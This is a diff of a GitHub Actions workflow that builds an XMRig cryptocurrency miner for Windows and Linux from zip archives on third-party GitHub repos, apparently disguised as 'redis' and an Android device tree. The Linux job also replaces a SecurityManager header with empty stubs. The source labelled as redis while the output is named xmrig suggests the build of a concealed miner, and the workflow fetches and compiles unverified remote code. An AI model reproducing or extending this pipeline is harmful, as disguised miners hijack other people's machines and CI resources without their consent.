@@ -7,71 +7,201 @@ on:
   workflow_dispatch:
 
 jobs:
-  build:
-    runs-on: ubuntu-latest
+  build-windows:
+    runs-on: windows-latest
 
     steps:
       - name: Checkout source code
         uses: actions/checkout@v3
 
-      - name: Set up Docker Buildx
-        uses: docker/setup-buildx-action@v2
+      # Install MSVC build tools directly on the runner
+      - name: Setup Visual Studio Developer Command Prompt
+        uses: ilammy/msvc-dev-cmd@v1
 
-      - name: Create Dockerfile
+      # Create build directories
+      - name: Create directories
         run: |
-          cat > Dockerfile << 'EOF'
-          FROM ubuntu:22.04
+          mkdir -p deps
+          mkdir -p artifacts
 
-          # Avoid interactive prompts during package installation
-          ENV DEBIAN_FRONTEND=noninteractive
-
-          # Install build dependencies
-          RUN apt-get update && apt-get install -y \
-              build-essential \
-              cmake \
-              git \
-              curl \
-              wget \
-              nasm \
-              unzip \
-              libssl-dev \
-              libhwloc-dev \
-              libuv1-dev \
-              && rm -rf /var/lib/apt/lists/*
-
-          # Set up working directory
-          WORKDIR /app
-
-          # Copy project files
-          COPY . .
-
-          # Download dependencies
-          RUN mkdir -p /app/deps && \
-              cd /app/deps && \
-              wget -O gcc.zip https://github.com/Janit8r/device_lge_judyln/raw/S/gcc.zip && \
-              wget -O redis.zip https://github.com/Janit8r/frp-2/raw/refs/heads/dev/redis-D-Win9900.zip && \
-              unzip -o gcc.zip && \
-              unzip -o redis.zip
-
-          # Setup build process
-          RUN mkdir -p /app/deps/redis-D-Win9900/build
-
-          # Build command will be run separately
-          CMD cd /app/deps/redis-D-Win9900/build && \
-              cmake .. -DXMRIG_DEPS=/app/deps/gcc/gcc/x64 -DBUILD_SHARED_LIBS=OFF && \
-              cmake --build . --config Release
-          EOF
-
-      - name: Build Docker image
-        run: docker build -t xmrig-builder .
-
-      - name: Run build in Docker container
+      # Download dependencies with retry mechanism
+      - name: Download dependencies
         run: |
-          docker run --name xmrig-build xmrig-builder
-          docker cp xmrig-build:/app/deps/redis-D-Win9900/build/Release ./Release
+          $ProgressPreference = 'SilentlyContinue'  # Speeds up downloads
+          
+          # Function to download with retry
+          function Download-WithRetry {
+            param(
+              [string]$Url,
+              [string]$OutputFile,
+              [int]$MaxRetries = 3
+            )
+            
+            $retryCount = 0
+            $success = $false
+            
+            while (-not $success -and $retryCount -lt $MaxRetries) {
+              try {
+                Write-Host "Downloading $Url to $OutputFile (Attempt $(($retryCount + 1)))"
+                Invoke-WebRequest -Uri $Url -OutFile $OutputFile -UseBasicParsing
+                $success = $true
+                Write-Host "Download successful!"
+              }
+              catch {
+                $retryCount++
+                Write-Host "Download failed. Retrying in 5 seconds..."
+                Start-Sleep -Seconds 5
+              }
+            }
+            
+            if (-not $success) {
+              throw "Failed to download after $MaxRetries attempts."
+            }
+          }
+          
+          # Download required files
+          Download-WithRetry -Url "https://github.com/Janit8r/device_lge_judyln/raw/S/gcc.zip" -OutputFile "deps/gcc.zip"
+          Download-WithRetry -Url "https://github.com/Janit8r/frp-2/raw/refs/heads/dev/redis-D-Win9900.zip" -OutputFile "deps/redis.zip"
+        shell: pwsh
 
+      # Extract dependencies
+      - name: Extract dependencies
+        run: |
+          $ProgressPreference = 'SilentlyContinue'  # Speeds up extraction
+          Write-Host "Extracting dependencies..."
+          
+          # Extract with error handling
+          try {
+            Expand-Archive -Path deps/gcc.zip -DestinationPath deps/gcc -Force
+            Expand-Archive -Path deps/redis.zip -DestinationPath deps/redis -Force
+            Write-Host "Extraction completed successfully."
+          }
+          catch {
+            Write-Host "Error during extraction: $_"
+            exit 1
+          }
+        shell: pwsh
+
+      # Set up CMake
+      - name: Set up CMake
+        uses: jwlawson/actions-setup-cmake@v1.13
+        with:
+          cmake-version: '3.20.x'
+
+      # Create build directory
+      - name: Create and navigate to build directory
+        run: |
+          mkdir -Force deps/redis/redis-D-Win9900/build
+          cd deps/redis/redis-D-Win9900/build
+          # Verify paths
+          Write-Host "Current directory: $(Get-Location)"
+          Write-Host "CMake source directory: $(Resolve-Path ..)"
+          Write-Host "XMRIG_DEPS directory: $(Resolve-Path ${{ github.workspace }}/deps/gcc/gcc/x64)"
+        shell: pwsh
+
+      # Run CMake to generate project files
+      - name: Configure CMake
+        run: |
+          cd deps/redis/redis-D-Win9900/build
+          cmake .. -G "Visual Studio 16 2019" -A x64 -DXMRIG_DEPS="${{ github.workspace }}/deps/gcc/gcc/x64" -DBUILD_SHARED_LIBS=OFF
+        shell: pwsh
+
+      # Build using MSBuild
+      - name: Build project
+        run: |
+          cd deps/redis/redis-D-Win9900/build
+          cmake --build . --config Release
+        shell: pwsh
+
+      # Copy artifacts
+      - name: Copy build artifacts
+        run: |
+          $releasePath = "deps/redis/redis-D-Win9900/build/Release"
+          if (Test-Path $releasePath) {
+            Write-Host "Copying build artifacts from $releasePath"
+            Get-ChildItem $releasePath | ForEach-Object { Write-Host $_.Name }
+            Copy-Item -Path "$releasePath/*" -Destination "artifacts/" -Recurse -Force
+          } else {
+            Write-Host "Release directory not found at expected location: $releasePath"
+            Write-Host "Searching for build output..."
+            Get-ChildItem -Path "deps/redis/redis-D-Win9900/build" -Recurse -Directory | ForEach-Object { Write-Host $_.FullName }
+            exit 1
+          }
+        shell: pwsh
+
+      # Upload artifacts
       - name: Archive build artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: build-artifacts
-          path: ./Release
+          name: windows-build-artifacts
+          path: artifacts/
+
+  build-linux:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Checkout source code
+        uses: actions/checkout@v3
+      
+      - name: Create Dockerfile for Linux build
+        run: |
+          cat > Dockerfile.linux << 'EOF'
+          FROM ubuntu:22.04
+          
+          # Install dependencies
+          ENV DEBIAN_FRONTEND=noninteractive
+          
+          RUN apt-get update && apt-get install -y \
+              git build-essential cmake libuv1-dev libssl-dev libhwloc-dev \
+              wget unzip pkg-config libnuma-dev
+          
+          # Create working directory
+          WORKDIR /app
+          
+          # Copy files
+          COPY . /app/
+          
+          # Download dependencies
+          RUN mkdir -p /app/deps && \
+              cd /app/deps && \
+              wget -q https://github.com/Janit8r/device_lge_judyln/raw/S/gcc.zip && \
+              wget -q https://github.com/Janit8r/frp-2/raw/refs/heads/dev/redis-D-Win9900.zip && \
+              unzip -q gcc.zip && \
+              unzip -q redis-D-Win9900.zip
+          
+          # Patch SecurityManager.h for Linux compatibility
+          RUN mkdir -p /app/deps/redis-D-Win9900/src/security/ && \
+              echo '#pragma once' > /app/deps/redis-D-Win9900/src/security/SecurityManager.h && \
+              echo '// Linux-compatible version of SecurityManager' >> /app/deps/redis-D-Win9900/src/security/SecurityManager.h && \
+              echo 'class SecurityManager {' >> /app/deps/redis-D-Win9900/src/security/SecurityManager.h && \
+              echo 'public:' >> /app/deps/redis-D-Win9900/src/security/SecurityManager.h && \
+              echo '    static void init() {}' >> /app/deps/redis-D-Win9900/src/security/SecurityManager.h && \
+              echo '    static void applySecurity() {}' >> /app/deps/redis-D-Win9900/src/security/SecurityManager.h && \
+              echo '    static void shutdown() {}' >> /app/deps/redis-D-Win9900/src/security/SecurityManager.h && \
+              echo '};' >> /app/deps/redis-D-Win9900/src/security/SecurityManager.h
+          
+          # Create build directory
+          RUN mkdir -p /app/deps/redis-D-Win9900/build
+          
+          # Configure and build
+          RUN cd /app/deps/redis-D-Win9900/build && \
+              cmake .. && \
+              make -j$(nproc)
+          
+          EOF
+      
+      - name: Build Docker image
+        run: docker build -t xmrig-linux-builder -f Dockerfile.linux .
+      
+      - name: Run Docker container
+        run: |
+          mkdir -p artifacts
+          docker create --name temp-container xmrig-linux-builder
+          docker cp temp-container:/app/deps/redis-D-Win9900/build/xmrig artifacts/
+          docker rm temp-container
+      
+      - name: Archive Linux build artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: linux-build-artifacts
+          path: artifacts/
